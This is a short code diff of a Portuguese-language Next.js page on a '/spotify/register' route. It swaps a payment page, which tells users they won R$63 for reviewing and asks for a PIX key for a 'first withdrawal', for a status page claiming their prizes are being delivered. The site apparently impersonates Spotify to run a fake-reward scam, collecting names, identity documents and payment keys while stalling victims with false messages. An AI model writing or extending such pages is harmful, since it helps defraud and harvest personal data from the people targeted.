@@ -1,20 +1,12 @@
 import Image from "next/image";
 import Logo from '@/assets/logo-green.png'
 import { cookies } from "next/headers";
-import { FormPayment } from "./form-payment";
-import { redirect } from "next/navigation";
+import { Details } from "./details";
 
+export default function StatusPage() {
 
-export default function PaymentPage() {
 
   const name = cookies().get('user_name')
-  const document = cookies().get('user_document')
-
-
-
-  if (!name || !document) {
-    redirect('/spotify/register')
-  }
 
   return (
     <div className="w-full relative min-h-screen bg-[#181818] text-white">
@@ -37,21 +29,14 @@ export default function PaymentPage() {
           <h2 className='text-2xl font-bold text-center'>Olá, {name?.value.toUpperCase().split(" ")[0]}!</h2>
 
 
-          <div className='text-center bg-[#01d661]/40 border border-[#01D661] p-4 rounded-lg text-white/90'>
-            Você ganhou <span className='text-sm font-bold text-white'>{new Intl.NumberFormat('pt-BR', {
-              style: 'currency',
-              currency: 'BRL'
-            }).format(63)}
-            </span>
-            {" "}por avaliar!
-          </div>
+          <p className="text-center text-white font-bold pt-10">
+            Já estamos finalizando todo o processo de entrega dos seus premios, fica comigo aqui equanto eu finalizo todos os envios para você!
+          </p>
 
 
-          <p className="text-sm font-[#a8a8a8] text-center">Realize seu <span className="font-bold text-white">PRIMEIRO SAQUE!</span></p>
-          <p className="text-sm font-[#a8a8a8] text-center">Escolha sua chave PIX:</p>
+          <Details />
 
 
-          <FormPayment name={name.value} document={document.value} />
 
           <p className="text-center text-[#a8a8a8] pt-10">
             Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Google.</b>
